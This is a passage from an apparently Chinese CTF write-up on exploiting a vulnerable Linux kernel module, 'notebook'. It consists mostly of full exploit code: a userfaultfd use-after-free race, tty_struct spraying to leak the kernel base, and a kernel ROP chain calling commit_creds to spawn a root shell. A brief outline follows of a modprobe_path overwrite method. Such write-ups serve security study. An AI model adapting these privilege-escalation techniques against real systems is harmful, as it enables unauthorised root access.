class=\"meta\">#<span class=\"keyword\">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class=\"line\"><span class=\"comment\">//如果我们申请0x2E0的空间，slab分配的堆实际大小为0x400 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect1[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> ptmx_fds[<span class=\"number\">0x100</span>];<span class=\"comment\">// 测了我很久才发现这个b被不知道谁溢出了 加两个保护挡一下</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect2[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">init</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\ta[SWAPGS_POP_RET] \t\t\t= <span class=\"number\">0xffffffff810637d4</span>;</span><br><span class=\"line\">\ta[IRETQ] \t\t\t\t\t= <span class=\"number\">0xffffffff810338bb</span>;</span><br><span class=\"line\">\ta[COMMIT_CREDS] \t\t\t= <span class=\"number\">0xffffffff810a9b40</span>;</span><br><span class=\"line\">\ta[PREPARE_KERNEL_CRED]\t\t= <span class=\"number\">0xffffffff810a9ef0</span>;</span><br><span class=\"line\">\ta[SUB_RSP_RET] \t\t\t\t= <span class=\"number\">0xffffffff8100354f</span>;</span><br><span class=\"line\">\ta[PUSH_RDI_POP_RSP_POP_RET] = <span class=\"number\">0xffffffff8143f4e1</span>;</span><br><span class=\"line\">\ta[POP_RDI]\t\t\t\t    = <span class=\"number\">0xffffffff81007115</span>;</span><br><span class=\"line\">\ta[POP_RSP] \t\t\t\t\t= <span class=\"number\">0xffffffff810bc110</span>;</span><br><span class=\"line\">\ta[MOV_RDI_RAX_POP_RET]\t\t= <span class=\"number\">0xffffffff81045833</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">addKernelBase</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class=\"line\">\t\ta[i] += kernel_base_addr - <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getshell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;UID is %d&quot;</span>, getuid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;Get shell&quot;</span>);</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Get shell failed&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t__asm__ (</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pop user_flags;&quot;</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *(*pkc)(<span class=\"type\">int</span>) = (<span class=\"type\">void</span> *(*)(<span class=\"type\">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*cc)(<span class=\"type\">void</span> *) = (<span class=\"type\">void</span> (*)(<span class=\"type\">void</span> *))(a[COMMIT_CREDS]);</span><br><span class=\"line\">\t(*cc)((*pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">(<span class=\"type\">size_t</span> idx)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">gift</span><span class=\"params\">(<span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// 逆向 mynote_read可以得到</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> *buf;</span><br><span class=\"line\">\tu64 size;</span><br><span class=\"line\">&#125;notebook;</span><br><span class=\"line\"></span><br><span class=\"line\">notebook ntbk[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\">u64 fake_tty_struct[<span class=\"number\">128</span>];</span><br><span class=\"line\">u64 fake_tty_ops[<span class=\"number\">128</span>];</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tsaveState();</span><br><span class=\"line\"></span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// name的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_page = mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class=\"line\">\t\t\t\t\t\tMAP_PRIVATE | MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span> ,<span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x3ff</span> ,zero);<span class=\"comment\">// 重新申请一个0x400的块</span></span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x400</span> ,fault_page);<span class=\"comment\">// 返回上一个原块的地址 写完size就卡住</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\tInfo(<span class=\"string\">&quot;ptmx_fds[%d] is %d&quot;</span>, i, ptmx_fds[i]);</span><br><span class=\"line\">\t\tptmx_fds[i] = open(<span class=\"string\">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">// 此时gdb看内存 可以看到相关泄漏的地址</span></span><br><span class=\"line\">\tkernel_base_addr = fake_tty_struct[<span class=\"number\">3</span>] - <span class=\"number\">0xe8e440</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\taddKernelBase();</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>, zero);<span class=\"comment\">// ROP</span></span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>, <span class=\"number\">0x60</span>, zero);<span class=\"comment\">// tty ops </span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgift(ntbk);</span><br><span class=\"line\">\tu64 tty_ops_addr = ntbk[<span class=\"number\">2</span>].buf;</span><br><span class=\"line\">\tu64 rop_addr = ntbk[<span class=\"number\">1</span>].buf;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;rop&#x27;s addr is 0x%lx&quot;</span>, rop_addr);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;tty_ops_addr&#x27;s addr is 0x%lx&quot;</span>, tty_ops_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] \t\t= tty_ops_addr;</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8100354f                  sub    rsp, 0xffffffffffffff80</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003553                  pop    rbx</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003554                  pop    rbp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003555                  ret </span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">1</span>] \t\t= a[SUB_RSP_RET];<span class=\"comment\">// rsp + 0x80 + pop * 2 = 18 * 8</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">0x14</span>]\t= a[POP_RSP];<span class=\"comment\">// 1 + 18 + 1 = 0x14</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">0x15</span>]\t= rop_addr;<span class=\"comment\">// 第二次栈迁移</span></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(0, fake_tty_struct);&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// write operation , rdi is tty_struct&#x27;s addr</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e1                  push   rdi</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e2                  pop    rsp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e3                  pop    rbp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e4                  or     eax, edx</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e6                  ret </span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tfake_tty_ops[<span class=\"number\">7</span>] = a[PUSH_RDI_POP_RSP_POP_RET];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tu64 ROP[<span class=\"number\">0x20</span>];<span class=\"comment\">// 这个ROP是要写入内核的 不需要去打CR4关smep</span></span><br><span class=\"line\">\tROP[i++] = a[POP_RDI];</span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[PREPARE_KERNEL_CRED];<span class=\"comment\">// rax = prepare_kernel_cred(0)</span></span><br><span class=\"line\">\tROP[i++] = a[MOV_RDI_RAX_POP_RET];<span class=\"comment\">// rdi = rax</span></span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[COMMIT_CREDS];<span class=\"comment\">// commit_creds(rdi) get root</span></span><br><span class=\"line\">\tROP[i++] = a[SWAPGS_POP_RET];</span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[IRETQ];</span><br><span class=\"line\">\tROP[i++] = (u64)getshell;</span><br><span class=\"line\">\tROP[i++] = user_cs;</span><br><span class=\"line\">\tROP[i++] = user_flags;</span><br><span class=\"line\">\tROP[i++] = user_sp;</span><br><span class=\"line\">\tROP[i++] = user_ss;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(1, ROP)&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, ROP);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(2, fake_tty_ops)&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">2</span>, fake_tty_ops);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> tmp[] = <span class=\"string\">&quot;squsqusqusqu&quot;</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Spray write ptmx start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Dbg(&quot;fd is [%d]&quot;, ptmx_fds[i]);</span></span><br><span class=\"line\">\t\twrite(ptmx_fds[i], tmp, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;exploit&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;regitser&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\t\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\t\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">// user code modify area</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x500</span>, zero);<span class=\"comment\">// 第一个edit free掉vuln chunk</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x400</span>, zero);<span class=\"comment\">// 第二个edit 确保size不变</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\t\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)zero;</span><br><span class=\"line\">\t\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\t\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\t\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;ioctl done&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/09/11/kernel-notebook-three-solutions/2.png\" alt=\"Pasted image 20220910222000\"></p>\n<h2 id=\"modprobe\"><a class=\"markdownIt-Anchor\" href=\"#modprobe\">#</a> modprobe</h2>\n<p>篡改 modprobe 执行特权指令</p>\n<p>write 没加锁 轻而易举配合 uffd 写 uaf</p>\n<p>一个是注意泄漏 cookie</p>\n<p>另外一个就是链表结尾的异或表达式 （给 name 给你写就是方便伪造这个的）</p>\n<ul>\n<li>通过 gift 泄漏得到结构体 <code>notebook</code>  的地址信息 由于是 c 程序进行交互，所以有了 notebook 地址信息 就能通过指针任意读取内部的其他信息了 比如 cookie</li>\n<li>利用 setxattr 和 uffd 进行任意 uaf 劫持 篡改 notebook 通过 ko 中的 call 重定向泄漏内核基址</li>\n<li>另外一个指针劫持到 <code>notebook</code>  的地址 这样就能继续篡改 让其指向 <code>modprobe_path</code></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span 